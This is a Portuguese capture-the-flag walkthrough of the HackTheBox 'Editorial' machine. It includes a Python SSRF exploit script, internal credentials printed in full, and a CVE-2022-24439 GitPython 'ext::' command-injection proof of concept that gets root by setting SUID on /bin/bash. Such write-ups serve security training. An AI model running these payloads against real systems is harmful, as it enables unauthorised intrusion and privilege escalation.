---
title: "HackTheBox - Editorial"
author: mithr4nd1r
date: 2024-06-15 11:00:00 -0300
categories: [Walkthrough, HackTheBox]
tags: [writeup, walkthrough, hackthebox, htb, pentest, ctf, linux, easy, ssrf, flask, git, gitpython, cve-2022-24439, sudo]
pin: false
---

> **Dificuldade**: Fácil (opinião: difícil)
{: .prompt-info }

> Writeup importado do Notion. Imagens originais omitidas.
{: .prompt-tip }

## 1. Escaneamento

```
Nmap scan report for 10.10.11.20 (10.10.11.20)
Host is up (0.36s latency).
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.7
80/tcp open  http    nginx 1.18.0 (Ubuntu)
```

## 2. Enumeração

### Web (80)

Aplicação editorial. Campo **Cover URL** aceita URL externa para baixar imagem de capa → SSRF detectado (servidor envia request HTTP para URL controlada).

Bruteforce de portas internas via SSRF revela porta `5000` aberta — API Flask interna em `http://127.0.0.1:5000`.

### Exploit Script (Villar)

```python
import requests
import json
import argparse

def make_request(url):
    target = "http://editorial.htb:80/upload-cover"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Content-Type": "multipart/form-data; boundary=----WebKitFormBoundaryAHukwE0p0OHdJe5n",
        "Origin": "http://editorial.htb",
        "Referer": "http://editorial.htb/upload"
    }
    data = (
        "------WebKitFormBoundaryAHukwE0p0OHdJe5n\r\n"
        f"Content-Disposition: form-data; name=\"bookurl\"\r\n\r\n{url}\r\n"
        "------WebKitFormBoundaryAHukwE0p0OHdJe5n\r\n"
        "Content-Disposition: form-data; name=\"bookfile\"; filename=\"\"\r\n"
        "Content-Type: application/octet-stream\r\n\r\n\r\n"
        "------WebKitFormBoundaryAHukwE0p0OHdJe5n--\r\n"
    )
    r = requests.post(target, headers=headers, data=data)
    csrf = r.text
    r = requests.get(f"http://editorial.htb/{csrf}", headers=headers)
    print(json.dumps(json.loads(r.text), indent=2))

if __name__ == "__main__":
    parser = argparse.ArgumentParser()
    parser.add_argument("-u", "--url", help="Url para requisição interna")
    args = parser.parse_args()
    make_request(args.url)
```

## 3. Acesso Inicial

Endpoint interno expõe credenciais:

```bash
python3 tiempo.py -u http://127.0.0.1:5000/api/latest/metadata/messages/authors
```

Credenciais retornadas: `dev` : `dev080217_devAPI!@`

Acesso SSH:

```bash
ssh dev@editorial.htb
```

## 4. Pós-Exploração

Dentro de `~/apps/` há um repositório `.git` exposto. Inspeção do histórico:

```bash
cd ~/apps && git log
git show b73481bb823d2dfb49c44f4c1e6a7e11912ed8ae
```

Commit revela credenciais antigas:

- Usuário: `prod`
- Senha: `080217_Producti0n_2023!@`

## 5. Escalação de Privilégio

Após `su prod`:

```bash
sudo -l
```

```
(root) NOPASSWD: /usr/bin/python3 /opt/internal_apps/clone_changes/clone_prod_change.py *
```

Script chama `git clone` via GitPython. Versão vulnerável a **CVE-2022-24439** (Remote Code Execution via `ext::` URL handler).

PoC:

```python
from git import Repo
r = Repo.init('', bare=True)
r.clone_from('ext::sh -c touch% /tmp/pwned', 'tmp', multi_options=["-c protocol.ext.allow=always"])
```

Adaptação para SUID bash:

```bash
sudo python3 /opt/internal_apps/clone_changes/clone_prod_change.py "ext::chmod +s /bin/bash"
/bin/bash -p
# euid=0(root)
```

## Resumo da Cadeia

| Etapa | Técnica |
|-------|---------|
| Recon | nmap, SSRF detection via Cover URL |
| Foothold | SSRF para descobrir API interna porta 5000 |
| Cred Leak | API expõe creds em endpoint `/api/latest/metadata/messages/authors` |
| Initial Access | SSH como `dev` |
| Lateral Movement | Git history revela creds do `prod` |
| PrivEsc | sudo GitPython + CVE-2022-24439 (`ext::` URL RCE) |
